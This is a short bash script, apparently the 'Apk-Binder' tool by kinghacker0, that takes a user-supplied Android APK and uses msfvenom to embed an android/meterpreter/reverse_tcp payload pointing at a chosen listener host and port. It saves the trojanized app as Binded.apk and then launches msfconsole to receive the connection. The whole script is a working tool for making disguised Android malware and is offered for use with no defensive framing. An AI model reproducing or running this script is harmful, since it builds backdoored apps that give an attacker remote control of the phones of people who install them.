#Author - github.com/kinghacker0
#Credit - Give me credit if you use any part of script

echo -e "\e[31m    ___        __       ___  _         __       \e[1m  "
echo -e "\e[31m   / _ | ___  / /______/ _ )(_)__  ___/ /__ ____ \e[1m  "
echo -e "\e[31m  / __ |/ _ \/  '_/___/ _  / / _ \/ _  / -_) __/ \e[1m  "
echo -e "\e[31m /_/ |_/ .__/_/\_\   /____/_/_//_/\_,_/\__/_/   \e[1m  "
echo -e "\e[31m      /_/                                     \e[1m  "
echo -e "\e[31mAuthor  = github.com/kinghacker0               \e[1m "
echo -e "\e[31mWebsite = hackersking.in               \e[1m "
echo -e "                                                "
#End-Banner

read -p "[*]Enter filepath of apk#~: " path
read -p "[*]Enter lhost#~: " lhost
read -p "[*]Enter lport#~: " lport
mkdir output && cd output
msfvenom -x $path -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> Binded.apk
echo "\e[30[*]Embed Apk available in output directory \e[0m"
read -p "[*]Start listner(Enter) or Close (Ctrl+c) :" listner
#listner start
msfconsole

#Changing this banner doesn't make you programmer..!"
